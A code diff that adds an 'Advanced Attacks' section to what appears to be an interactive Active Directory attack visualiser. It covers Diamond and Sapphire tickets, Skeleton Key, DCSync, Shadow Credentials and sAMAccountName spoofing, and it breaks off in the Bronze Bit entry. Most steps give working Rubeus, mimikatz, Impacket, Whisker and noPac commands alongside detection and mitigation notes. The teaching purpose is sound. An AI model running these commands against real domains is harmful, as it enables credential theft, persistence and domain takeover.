@@ -573,6 +573,7 @@
 				<button class="category-tab" data-category="roasting">Roasting Attacks</button>
 				<button class="category-tab" data-category="tickets">Ticket Attacks</button>
 				<button class="category-tab" data-category="delegation">Delegation Attacks</button>
+				<button class="category-tab" data-category="advanced">Advanced Attacks</button>
 			</div>
 
 			<!-- Topic Navigation -->
@@ -668,6 +669,16 @@
 			{ id: 's4u2self', name: 'S4U2Self Attack', icon: 'fa-user-secret', class: 'delegation' },
 			{ id: 's4u2proxy', name: 'S4U2Proxy Attack', icon: 'fa-exchange-alt', class: 'delegation' },
 			{ id: 'rbcd', name: 'Resource-Based Constrained Delegation', icon: 'fa-project-diagram', class: 'delegation' }
+		],
+		advanced: [
+			{ id: 'diamond-ticket', name: 'Diamond Ticket', icon: 'fa-gem', class: 'attack' },
+			{ id: 'sapphire-ticket', name: 'Sapphire Ticket', icon: 'fa-gem', class: 'attack' },
+			{ id: 'skeleton-key', name: 'Skeleton Key', icon: 'fa-skeleton', class: 'attack' },
+			{ id: 'dcsync', name: 'DCSync Attack', icon: 'fa-sync', class: 'attack' },
+			{ id: 'shadow-credentials', name: 'Shadow Credentials', icon: 'fa-user-ninja', class: 'attack' },
+			{ id: 'samaccountname-spoof', name: 'sAMAccountName Spoofing', icon: 'fa-mask', class: 'attack' },
+			{ id: 'bronze-bit', name: 'Bronze Bit (CVE-2020-17049)', icon: 'fa-coins', class: 'attack' },
+			{ id: 'dpapi-abuse', name: 'DPAPI Abuse', icon: 'fa-shield-alt', class: 'attack' }
 		]
 	};
 
@@ -1372,6 +1383,454 @@
 					active: 'target',
 					tech: `<b>🛡️ DETECTION:</b><br>• Event 4662: msDS-AllowedToActOnBehalfOfOtherIdentity modified<br>• Event 4769: S4U ticket requests<br>• New machine accounts created<br>• Unusual RBCD configurations<br><br><b>🛡️ MITIGATIONS:</b><br>• Set MachineAccountQuota to 0<br>• Audit GenericWrite ACLs on computers<br>• Monitor RBCD attribute changes<br>• Protected Users (blocks impersonation)<br>• Use PAM/tiered admin model`,
 					warning: 'Mitigations: Audit GenericWrite ACLs, Protected Users, monitor RBCD changes'
+				}
+			]
+		},
+
+		'diamond-ticket': {
+			title: 'Diamond Ticket Attack',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has KRBTGT AES Key', x: 8, y: 45 },
+				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 20 },
+				{ id: 'service', type: 'service', label: 'Any Service', sublabel: 'Target', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is Diamond Ticket?',
+					desc: 'Unlike Golden Ticket (forged from scratch), Diamond Ticket MODIFIES a legitimate TGT obtained from KDC. Much harder to detect!',
+					active: 'attacker',
+					tech: `<b>🆚 GOLDEN vs DIAMOND:</b><br>• <b>Golden:</b> Forged TGT, never touched KDC<br>• <b>Diamond:</b> Real TGT from KDC, then modified<br><br><b>✅ WHY DIAMOND IS STEALTHIER:</b><br>• Has valid KDC signature timestamps<br>• Matches KDC ticket cache patterns<br>• Passes PAC validation checks<br>• Evades "TGT without AS-REQ" detection`,
+					warning: 'Diamond Tickets are significantly harder to detect than Golden Tickets!'
+				},
+				{
+					title: '1. Obtain KRBTGT Keys',
+					desc: 'Need KRBTGT AES256 key (not just NT hash) for decryption and re-encryption.',
+					active: 'attacker',
+					tech: `<b>🎯 GET KRBTGT AES KEY:</b><br><code># Mimikatz DCSync</code><br><code>lsadump::dcsync /user:krbtgt /domain:corp.local</code><br><br><code># Impacket</code><br><code>secretsdump.py -just-dc-user krbtgt DOMAIN/admin:pass@DC01</code><br><br><b>📋 REQUIRED:</b><br>• KRBTGT AES256 key (not just RC4/NT hash)<br>• Used to decrypt, modify, re-encrypt TGT`
+				},
+				{
+					title: '2. Request Legitimate TGT',
+					desc: 'Request a real TGT from the KDC using any valid credentials.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ', type: 'as-req' },
+					tech: `<b>🎯 REQUEST REAL TGT:</b><br><code># Rubeus - request TGT</code><br><code>Rubeus.exe asktgt /user:lowpriv /password:Pass123 /nowrap</code><br><br><code># Or with hash</code><br><code>Rubeus.exe asktgt /user:lowpriv /rc4:HASH /nowrap</code><br><br><b>✅ KEY POINT:</b><br>• This creates a REAL ticket in KDC logs<br>• Event 4768 shows legitimate AS-REQ`
+				},
+				{
+					title: '3. Receive Valid TGT',
+					desc: 'KDC returns legitimate TGT encrypted with KRBTGT key.',
+					active: 'kdc',
+					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP + TGT', type: 'as-rep' }
+				},
+				{
+					title: '4. Decrypt & Modify TGT',
+					desc: 'Decrypt TGT with KRBTGT key, modify PAC (add Domain Admin groups), re-encrypt.',
+					active: 'attacker',
+					tech: `<b>🎯 RUBEUS - Diamond Ticket:</b><br><code># Create diamond ticket</code><br><code>Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:lowpriv /password:Pass123 /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512,519,520 /ptt</code><br><br><code># With DC specification</code><br><code>Rubeus.exe diamond /krbkey:KEY /user:lowpriv /password:Pass /dc:DC01.corp.local /enctype:aes /ticketuser:Admin /ticketuserid:500 /groups:512 /ptt</code><br><br><b>📋 PARAMETERS:</b><br>• /ticketuser: User to impersonate<br>• /ticketuserid: Target user RID (500=Admin)<br>• /groups: Groups to add to PAC`,
+					packet: { 'Original PAC': 'lowpriv user groups', 'Modified PAC': 'Domain Admins (512), Enterprise Admins (519)', 'Ticket metadata': 'Unchanged - still looks legitimate' }
+				},
+				{
+					title: '5. Use Modified TGT',
+					desc: 'Request service tickets with modified TGT. KDC sees valid encryption, trusts PAC.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'TGS-REQ', type: 'tgs-req' }
+				},
+				{
+					title: '6. Access Services as Admin',
+					desc: 'Service tickets issued with modified PAC. Full admin access achieved.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'service', label: 'AP-REQ', type: 'ap-req' },
+					tech: `<b>🛡️ DETECTION:</b><br>• Very difficult - ticket looks legitimate<br>• Compare PAC groups vs actual user groups<br>• Monitor for TGT reuse patterns<br>• Advanced: Ticket metadata analysis<br><br><b>🛡️ MITIGATIONS:</b><br>• Rotate KRBTGT key regularly<br>• Enable PAC validation<br>• Monitor privileged group membership<br>• Use Credential Guard`,
+					warning: 'Diamond Tickets are extremely difficult to detect compared to Golden Tickets'
+				}
+			]
+		},
+
+		'sapphire-ticket': {
+			title: 'Sapphire Ticket Attack',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has KRBTGT Key', x: 8, y: 45 },
+				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 20 },
+				{ id: 'service', type: 'service', label: 'Target Service', sublabel: 'Any Service', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is Sapphire Ticket?',
+					desc: 'Like Diamond Ticket but uses S4U2Self to get a PAC for a different user, then modifies and inserts it into a TGT. Maximum stealth!',
+					active: 'attacker',
+					tech: `<b>🆚 DIAMOND vs SAPPHIRE:</b><br>• <b>Diamond:</b> Modifies PAC directly<br>• <b>Sapphire:</b> Gets REAL PAC via S4U2Self, inserts into TGT<br><br><b>✅ WHY SAPPHIRE IS EVEN STEALTHIER:</b><br>• PAC is legitimately signed by KDC<br>• PAC contents match real user exactly<br>• Only the TGT container is modified<br>• Passes all PAC signature validations`,
+					warning: 'Sapphire Tickets have legitimate PAC signatures - nearly impossible to detect!'
+				},
+				{
+					title: '1. Get KRBTGT Key + Service Account',
+					desc: 'Need KRBTGT AES key and control of any service account with SPN.',
+					active: 'attacker',
+					tech: `<b>📋 REQUIREMENTS:</b><br>• KRBTGT AES256 key<br>• Control of account with SPN (for S4U2Self)<br>• Can use machine account or service account<br><br><b>🎯 GET KEYS:</b><br><code># DCSync KRBTGT</code><br><code>lsadump::dcsync /user:krbtgt</code><br><br><code># Machine account has SPN by default</code><br><code>Rubeus.exe hash /password:MachinePass</code>`
+				},
+				{
+					title: '2. S4U2Self for Target User PAC',
+					desc: 'Use S4U2Self to get a legitimate service ticket (with PAC) for the target user.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
+					tech: `<b>🎯 GET LEGITIMATE PAC:</b><br><code># S4U2Self to get Admin's PAC</code><br><code>Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:HASH /impersonateuser:Administrator /self /nowrap</code><br><br><b>✅ RESULT:</b><br>• Service ticket with Admin's real PAC<br>• PAC is signed by KDC<br>• Contains real group memberships`
+				},
+				{
+					title: '3. KDC Returns Signed PAC',
+					desc: 'KDC returns service ticket containing legitimately signed PAC for target user.',
+					active: 'kdc',
+					anim: { from: 'kdc', to: 'attacker', label: 'TGS (with PAC)', type: 'tgs-rep' },
+					tech: `<b>✅ PAC CONTAINS:</b><br>• Real user SID and groups<br>• KDC signature (server checksum)<br>• Privilege attribute certificate<br>• All legitimately signed!`
+				},
+				{
+					title: '4. Request & Decrypt TGT',
+					desc: 'Get a TGT for low-priv user and decrypt it with KRBTGT key.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ', type: 'as-req' },
+					tech: `<b>🎯 GET TGT TO MODIFY:</b><br><code># Request TGT</code><br><code>Rubeus.exe asktgt /user:lowpriv /password:Pass /nowrap</code><br><br><code># Decrypt with KRBTGT key</code><br><code># (Done internally by Rubeus sapphire)</code>`
+				},
+				{
+					title: '5. Insert Legitimate PAC into TGT',
+					desc: 'Replace TGT\'s PAC with the legitimate PAC from S4U2Self. Re-encrypt with KRBTGT key.',
+					active: 'attacker',
+					tech: `<b>🎯 RUBEUS - Sapphire Ticket:</b><br><code>Rubeus.exe sapphire /krbkey:KRBTGT_AES256 /user:lowpriv /password:Pass123 /impersonateuser:Administrator /ptt</code><br><br><code># With domain info</code><br><code>Rubeus.exe sapphire /krbkey:KEY /user:lowpriv /password:Pass /domain:corp.local /dc:DC01 /impersonateuser:Admin /ptt</code><br><br><b>✅ SAPPHIRE ADVANTAGE:</b><br>• PAC signatures are REAL from KDC<br>• Passes PAC_SERVER_CHECKSUM validation<br>• Passes PAC_PRIVSVR_CHECKSUM validation`,
+					packet: { 'TGT Shell': 'From legitimate AS exchange', 'PAC Content': 'Real Admin PAC from S4U2Self', 'PAC Signatures': 'Legitimate KDC signatures' }
+				},
+				{
+					title: '6. Full Admin Access',
+					desc: 'Use Sapphire Ticket like normal TGT. All validations pass because PAC is legitimate.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'service', label: 'TGS-REQ → AP-REQ', type: 'ap-req' },
+					tech: `<b>🛡️ DETECTION:</b><br>• Extremely difficult<br>• PAC is legitimately signed<br>• Must correlate S4U2Self with TGT usage<br>• Look for S4U2Self patterns followed by admin access<br><br><b>🛡️ MITIGATIONS:</b><br>• Rotate KRBTGT frequently<br>• Monitor S4U2Self requests<br>• Audit service accounts with SPNs<br>• Credential Guard on sensitive systems`,
+					warning: 'Sapphire Tickets are the stealthiest form of ticket forgery - use PAC validation correlation for detection'
+				}
+			]
+		},
+
+		'skeleton-key': {
+			title: 'Skeleton Key Attack',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Domain Admin', x: 8, y: 45 },
+				{ id: 'dc', type: 'dc', label: 'Domain Controller', sublabel: 'LSASS Patched', x: 50, y: 45 },
+				{ id: 'anyuser', type: 'client', label: 'Any User', sublabel: 'Victim Account', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is Skeleton Key?',
+					desc: 'Patches LSASS on DC to accept a master password for ANY account while real passwords still work. Backdoor authentication!',
+					active: 'dc',
+					tech: `<b>🔑 SKELETON KEY CONCEPT:</b><br>• Patches LSASS memory on DC<br>• Adds master password backdoor<br>• Real passwords continue working<br>• Works for ALL domain accounts<br><br><b>⚠️ LIMITATIONS:</b><br>• Lost on DC reboot<br>• Must re-inject after restart<br>• Only affects patched DC<br>• Requires DA/SYSTEM on DC`,
+					warning: 'Skeleton Key is NOT persistent - lost on reboot!'
+				},
+				{
+					title: '1. Compromise Domain Controller',
+					desc: 'Need Domain Admin or SYSTEM access on the DC.',
+					active: 'attacker',
+					tech: `<b>📋 REQUIREMENTS:</b><br>• Domain Admin credentials<br>• SYSTEM access on DC<br>• Or ability to run code on DC<br><br><b>🎯 ACCESS METHODS:</b><br>• PSRemoting as DA<br>• RDP as DA<br>• PsExec as DA<br>• Golden Ticket + PSExec`
+				},
+				{
+					title: '2. Inject Skeleton Key',
+					desc: 'Patch LSASS memory to add master password backdoor.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'dc', label: 'Patch LSASS', type: 'malicious' },
+					tech: `<b>🎯 MIMIKATZ - Skeleton Key:</b><br><code># Default password: mimikatz</code><br><code>privilege::debug</code><br><code>misc::skeleton</code><br><br><b>🎯 REMOTE EXECUTION:</b><br><code># Via PSExec</code><br><code>PsExec.exe \\\\DC01 -s cmd /c "mimikatz.exe privilege::debug misc::skeleton exit"</code><br><br><code># Via PSRemoting</code><br><code>Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName DC01</code><br><br><b>⚠️ LSASS PROTECTION:</b><br>• If Credential Guard enabled, use:<br><code>misc::skeleton /patch</code>`,
+					warning: 'Default skeleton key password is: mimikatz'
+				},
+				{
+					title: '3. LSASS Patched',
+					desc: 'DC now accepts master password (mimikatz) for any account.',
+					active: 'dc',
+					tech: `<b>✅ AFTER INJECTION:</b><br>• Real passwords still work<br>• Master password also works<br>• Affects all domain accounts<br>• No account lockouts triggered<br><br><b>⚠️ DC-SPECIFIC:</b><br>• Only works on patched DC<br>• Auth to other DCs = normal<br>• Target specific DC for auth`
+				},
+				{
+					title: '4. Authenticate as Any User',
+					desc: 'Use skeleton key password to authenticate as any domain user.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'dc', label: 'Auth: Admin/mimikatz', type: 'as-req' },
+					tech: `<b>🎯 USE SKELETON KEY:</b><br><code># Authenticate as any user with master password</code><br><code>runas /user:DOMAIN\\Administrator /netonly cmd</code><br><code>Password: mimikatz</code><br><br><code># Access resources</code><br><code>dir \\\\DC01\\c$</code><br><code>Enter-PSSession -ComputerName DC01</code><br><br><code># Impacket (specify DC)</code><br><code>psexec.py DOMAIN/Administrator:mimikatz@DC01</code>`
+				},
+				{
+					title: '5. Persistence Until Reboot',
+					desc: 'Skeleton key remains active until DC reboots or LSASS restarts.',
+					active: 'dc',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 7045: Mimikatz service install<br>• Event 4673: Sensitive privilege use<br>• LSASS memory anomalies<br>• System event 1: Kernel driver load<br>• Monitor for lsass.exe patches<br><br><b>🛡️ MITIGATIONS:</b><br>• Enable Credential Guard<br>• Run LSASS as Protected Process<br>• Monitor LSASS integrity<br>• Use multiple DCs (auth load balancing)<br>• Regular DC reboots`,
+					warning: 'For persistence, attacker must re-inject after every DC reboot'
+				}
+			]
+		},
+
+		'dcsync': {
+			title: 'DCSync Attack',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Replication Rights', x: 10, y: 45 },
+				{ id: 'dc', type: 'dc', label: 'Domain Controller', sublabel: 'Victim DC', x: 55, y: 45 },
+				{ id: 'krbtgt', type: 'krbtgt', label: 'KRBTGT', sublabel: 'All Secrets', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is DCSync?',
+					desc: 'Abuse AD replication protocol (MS-DRSR) to request password hashes from DC. No malware on DC needed!',
+					active: 'attacker',
+					tech: `<b>📋 DCSYNC CONCEPT:</b><br>• Uses Directory Replication Service (DRS)<br>• Mimics DC-to-DC replication<br>• Requests secrets via GetNCChanges<br>• No code execution on DC needed<br><br><b>✅ ADVANTAGE:</b><br>• Doesn't touch DC filesystem<br>• Doesn't require DC access<br>• Just needs network access + rights`,
+					warning: 'DCSync only requires network access and replication rights - no DC compromise needed!'
+				},
+				{
+					title: '1. Check/Obtain Replication Rights',
+					desc: 'Need DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.',
+					active: 'attacker',
+					tech: `<b>📋 REQUIRED PERMISSIONS:</b><br>• DS-Replication-Get-Changes<br>• DS-Replication-Get-Changes-All<br>• (Optional) DS-Replication-Get-Changes-In-Filtered-Set<br><br><b>🔍 WHO HAS THESE:</b><br>• Domain Admins (default)<br>• Enterprise Admins (default)<br>• Domain Controllers group<br>• Custom delegated accounts<br><br><b>🎯 CHECK PERMISSIONS:</b><br><code># PowerView</code><br><code>Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match "Replication"}</code><br><br><code># BloodHound - look for DCSync edges</code>`
+				},
+				{
+					title: '2. Request Replication',
+					desc: 'Send GetNCChanges request to DC pretending to be another DC.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'dc', label: 'GetNCChanges (DRSR)', type: 'malicious' },
+					tech: `<b>🎯 MIMIKATZ DCSync:</b><br><code># Single user</code><br><code>lsadump::dcsync /user:krbtgt /domain:corp.local</code><br><br><code># All users</code><br><code>lsadump::dcsync /all /csv</code><br><br><code># Specific DC</code><br><code>lsadump::dcsync /user:Administrator /domain:corp.local /dc:DC01</code><br><br><b>🐧 IMPACKET:</b><br><code># All hashes</code><br><code>secretsdump.py DOMAIN/admin:pass@DC01</code><br><br><code># Just KRBTGT</code><br><code>secretsdump.py -just-dc-user krbtgt DOMAIN/admin:pass@DC01</code><br><br><code># With hashes</code><br><code>secretsdump.py -hashes :NTHASH DOMAIN/admin@DC01</code>`
+				},
+				{
+					title: '3. DC Returns Secrets',
+					desc: 'DC responds with password hashes, Kerberos keys, and password history.',
+					active: 'dc',
+					anim: { from: 'dc', to: 'attacker', label: 'Password Hashes', type: 'malicious' },
+					tech: `<b>✅ DATA RECEIVED:</b><br>• NT hash (NTLM)<br>• LM hash (if stored)<br>• Kerberos AES256 key<br>• Kerberos AES128 key<br>• Password history hashes<br>• Cleartext password (if reversible encryption)<br>• Supplemental credentials`
+				},
+				{
+					title: '4. Extract KRBTGT Hash',
+					desc: 'KRBTGT hash enables Golden Ticket. All user hashes available.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'krbtgt', label: 'Golden Ticket!', type: 'ticket' },
+					tech: `<b>🎯 POST-DCSYNC:</b><br><code># Create Golden Ticket with KRBTGT hash</code><br><code>Rubeus.exe golden /rc4:KRBTGT_HASH /user:Admin /domain:corp.local /sid:S-1-5-21-xxx /ptt</code><br><br><code># Pass-the-Hash with admin</code><br><code>sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd</code><br><br><code># Crack hashes offline</code><br><code>hashcat -m 1000 hashes.txt wordlist.txt</code>`
+				},
+				{
+					title: '5. Domain Fully Compromised',
+					desc: 'All domain secrets extracted. Persistent access via Golden Ticket.',
+					active: 'krbtgt',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 4662: DS-Replication-Get-Changes-All accessed<br>• Event 4624: Logon from non-DC<br>• Replication traffic from non-DC IP<br>• Directory Service Access audit logs<br><br><b>🛡️ MITIGATIONS:</b><br>• Audit replication permissions<br>• Remove unnecessary replication rights<br>• Monitor 4662 events<br>• Alert on replication from non-DCs<br>• Use AdminSDHolder monitoring`,
+					warning: 'KRBTGT hash = Golden Ticket = Persistent Domain Compromise'
+				}
+			]
+		},
+
+		'shadow-credentials': {
+			title: 'Shadow Credentials Attack',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'GenericWrite on Target', x: 8, y: 45 },
+				{ id: 'target', type: 'client', label: 'Target', sublabel: 'User/Computer', x: 45, y: 20 },
+				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 45, y: 70 },
+				{ id: 'result', type: 'service', label: 'Result', sublabel: 'NT Hash / TGT', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is Shadow Credentials?',
+					desc: 'Abuse msDS-KeyCredentialLink attribute to add rogue certificate for PKINIT authentication. Get TGT and NT hash!',
+					active: 'target',
+					tech: `<b>📋 SHADOW CREDENTIALS:</b><br>• Abuses Windows Hello for Business (WHfB)<br>• msDS-KeyCredentialLink stores public keys<br>• Write access = add your own key<br>• Authenticate via PKINIT as target<br><br><b>✅ REQUIREMENTS:</b><br>• GenericWrite on target object<br>• ADCS not required (just DC support)<br>• Windows Server 2016+ DC`,
+					warning: 'Shadow Credentials requires GenericWrite/GenericAll on target account!'
+				},
+				{
+					title: '1. Check Permissions',
+					desc: 'Need GenericWrite/GenericAll or WriteProperty on target to modify msDS-KeyCredentialLink.',
+					active: 'attacker',
+					tech: `<b>🔍 FIND TARGETS (BloodHound):</b><br><code>MATCH (a)-[:GenericWrite|GenericAll|WriteProperty]->(t)</code><br><code>WHERE t:User OR t:Computer</code><br><code>RETURN a,t</code><br><br><b>🔍 PowerView:</b><br><code>Get-DomainObjectAcl -Identity "target" | ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite"}</code>`
+				},
+				{
+					title: '2. Add Shadow Credential',
+					desc: 'Generate certificate keypair and add public key to target\'s msDS-KeyCredentialLink.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'target', label: 'Add KeyCredential', type: 'malicious' },
+					tech: `<b>🎯 WHISKER (C#):</b><br><code># Add shadow credential</code><br><code>Whisker.exe add /target:victimuser /domain:corp.local /dc:DC01</code><br><br><code># Will output certificate + Rubeus command</code><br><br><b>🐧 PYWHISKER (Python):</b><br><code>pywhisker.py -d corp.local -u attacker -p Pass --target victimuser --action add</code><br><br><code># With hash</code><br><code>pywhisker.py -d corp.local -u attacker --hashes :HASH --target victim --action add</code><br><br><b>📋 OUTPUT:</b><br>• PFX certificate file<br>• Certificate password<br>• Rubeus command for PKINIT`
+				},
+				{
+					title: '3. Authenticate via PKINIT',
+					desc: 'Use the certificate to request TGT via PKINIT. AS-REP contains encrypted NT hash!',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'PKINIT AS-REQ', type: 'as-req' },
+					tech: `<b>🎯 RUBEUS PKINIT:</b><br><code># From Whisker output</code><br><code>Rubeus.exe asktgt /user:victimuser /certificate:cert.pfx /password:CERTPASS /domain:corp.local /dc:DC01 /getcredentials /show /nowrap /ptt</code><br><br><b>📋 KEY FLAGS:</b><br>• /getcredentials - Extract NT hash from PAC<br>• /ptt - Inject TGT<br>• /nowrap - Base64 on single line`
+				},
+				{
+					title: '4. Receive TGT + NT Hash',
+					desc: 'KDC returns TGT. PAC_CREDENTIAL_INFO contains encrypted NT hash (U2U trick).',
+					active: 'kdc',
+					anim: { from: 'kdc', to: 'result', label: 'TGT + NT Hash', type: 'as-rep' },
+					tech: `<b>✅ RECEIVED:</b><br>• Valid TGT for target user<br>• NT hash from PAC_CREDENTIAL_INFO<br>• Can now Pass-the-Hash<br>• Can now authenticate anywhere as target<br><br><b>🎯 USE NT HASH:</b><br><code># Pass-the-Hash</code><br><code>sekurlsa::pth /user:victim /domain:corp.local /ntlm:HASH /run:cmd</code>`
+				},
+				{
+					title: '5. Clean Up (Optional)',
+					desc: 'Remove the shadow credential to avoid detection.',
+					active: 'attacker',
+					tech: `<b>🎯 REMOVE SHADOW CRED:</b><br><code># Whisker - List</code><br><code>Whisker.exe list /target:victimuser</code><br><br><code># Whisker - Remove by DeviceID</code><br><code>Whisker.exe remove /target:victimuser /deviceid:GUID</code><br><br><code># PyWhisker</code><br><code>pywhisker.py -d corp.local -u attacker -p Pass --target victim --action remove --deviceid GUID</code><br><br><b>🛡️ DETECTION:</b><br>• Event 5136: msDS-KeyCredentialLink modified<br>• Event 4768: PKINIT authentication<br>• Monitor KeyCredentialLink changes<br><br><b>🛡️ MITIGATIONS:</b><br>• Audit GenericWrite permissions<br>• Monitor msDS-KeyCredentialLink changes<br>• Enable advanced auditing`,
+					warning: 'Always clean up shadow credentials to avoid detection!'
+				}
+			]
+		},
+
+		'samaccountname-spoof': {
+			title: 'sAMAccountName Spoofing (CVE-2021-42278/42287)',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Low Privilege', x: 8, y: 45 },
+				{ id: 'machineacct', type: 'service', label: 'Machine Acct', sublabel: 'Created by Attacker', x: 35, y: 20 },
+				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 55, y: 70 },
+				{ id: 'dc', type: 'dc', label: 'DC', sublabel: 'Impersonated', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is sAMAccountName Spoofing?',
+					desc: 'CVE-2021-42278 + CVE-2021-42287: Create machine account, rename to DC name, get TGT, rename back, request S4U2Self as DC!',
+					active: 'attacker',
+					tech: `<b>📋 VULNERABILITY CHAIN:</b><br>• CVE-2021-42278: sAMAccountName spoofing<br>• CVE-2021-42287: KDC confusion on TGT renewal<br><br><b>✅ ATTACK FLOW:</b><br>1. Create machine account<br>2. Remove trailing $ from name<br>3. Rename to DC sAMAccountName<br>4. Request TGT (as "DC")<br>5. Rename back<br>6. Request S4U2Self → DC ticket!`,
+					warning: 'This vulnerability was patched in November 2021 - CVE-2021-42278/42287'
+				},
+				{
+					title: '1. Create Machine Account',
+					desc: 'Create machine account (default quota = 10 per user).',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'machineacct', label: 'Create', type: 'ticket' },
+					tech: `<b>🎯 CREATE MACHINE ACCOUNT:</b><br><code># PowerMad</code><br><code>New-MachineAccount -MachineAccount "YOURPC" -Password (ConvertTo-SecureString "Pass123" -AsPlain -Force)</code><br><br><code># Impacket</code><br><code>addcomputer.py -computer-name YOURPC -computer-pass Pass123 corp.local/user:pass</code>`
+				},
+				{
+					title: '2. Rename to DC Name',
+					desc: 'Change sAMAccountName to match Domain Controller (without trailing $).',
+					active: 'attacker',
+					tech: `<b>🎯 RENAME MACHINE ACCOUNT:</b><br><code># PowerShell</code><br><code>Set-ADComputer YOURPC -SamAccountName "DC01"</code><br><br><code># Note: Remove the $ suffix</code><br><code># DC name is usually DC01$ but we set it to DC01</code><br><br><b>⚠️ KEY POINT:</b><br>• Machine accounts end with $<br>• DC01$ is the real DC<br>• We rename ours to DC01 (no $)`
+				},
+				{
+					title: '3. Request TGT as "DC"',
+					desc: 'Request TGT for the spoofed account. KDC sees sAMAccountName = DC01.',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ (as DC01)', type: 'as-req' },
+					tech: `<b>🎯 GET TGT:</b><br><code># Rubeus</code><br><code>Rubeus.exe asktgt /user:DC01 /password:Pass123 /domain:corp.local /dc:DC01.corp.local /nowrap</code><br><br><code># Impacket</code><br><code>getTGT.py corp.local/DC01:Pass123</code>`
+				},
+				{
+					title: '4. Rename Account Back',
+					desc: 'Quickly rename machine account back to original name.',
+					active: 'attacker',
+					tech: `<b>🎯 RENAME BACK:</b><br><code>Set-ADComputer DC01 -SamAccountName "YOURPC$"</code><br><br><b>⚠️ TIMING:</b><br>• Must happen before TGT expires<br>• KDC will look for DC01 for S4U2Self<br>• Will find real DC01$ instead!`
+				},
+				{
+					title: '5. S4U2Self for DC Ticket',
+					desc: 'Use TGT for S4U2Self. KDC looks for DC01, finds real DC, issues DC\'s service ticket!',
+					active: 'attacker',
+					anim: { from: 'attacker', to: 'dc', label: 'S4U2Self → DC TGS', type: 's4u' },
+					tech: `<b>🎯 NOPAC TOOL (Automated):</b><br><code># Full automated attack</code><br><code>noPac.exe -domain corp.local -user lowpriv -pass Pass123 /dc DC01.corp.local /mAccount YOURPC /mPassword Pass123 /service cifs /ptt</code><br><br><b>🐧 IMPACKET:</b><br><code># Automated</code><br><code>noPac.py corp.local/user:pass -dc-ip 10.0.0.1 -use-ldap</code><br><br><b>🎯 MANUAL:</b><br><code># S4U2Self with spoofed TGT</code><br><code>Rubeus.exe s4u /ticket:SPOOFED_TGT /impersonateuser:Administrator /self /altservice:cifs/DC01 /ptt</code>`
+				},
+				{
+					title: '6. DC Compromise!',
+					desc: 'Have valid service ticket as Administrator to DC. Full domain compromise!',
+					active: 'dc',
+					tech: `<b>🎯 ACCESS DC:</b><br><code># Execute commands</code><br><code>psexec.exe \\\\DC01 cmd</code><br><br><code># DCSync</code><br><code>lsadump::dcsync /all</code><br><br><b>🛡️ DETECTION:</b><br>• Event 4741: Machine account created<br>• Event 4742: Machine account renamed<br>• sAMAccountName changes on computers<br>• Unusual S4U2Self patterns<br><br><b>🛡️ MITIGATIONS:</b><br>• Apply November 2021 patches!<br>• Set MachineAccountQuota to 0<br>• Monitor computer object changes`,
+					warning: 'Apply KB5008102 and KB5008380 patches to prevent this attack!'
+				}
+			]
+		},
+
+		'bronze-bit': {
+			title: 'Bronze Bit Attack (CVE-2020-17049)',
+			entities: [
+				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has Service Hash', x: 8, y: 45 },
+				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 20 },
+				{ id: 'protected', type: 'client', label: 'Protected User', sublabel: 'Sensitive Account', x: 50, y: 70 },
+				{ id: 'target', type: 'service', label: 'Target Service', sublabel: 'AllowedToDelegateTo', x: 88, y: 45 }
+			],
+			steps: [
+				{
+					title: 'What is Bronze Bit?',
+					desc: 'CVE-2020-17049: Bypass "Account is sensitive" and "Protected Users" by forging Forwardable flag in S4U2Self ticket.',
+					active: 'attacker',
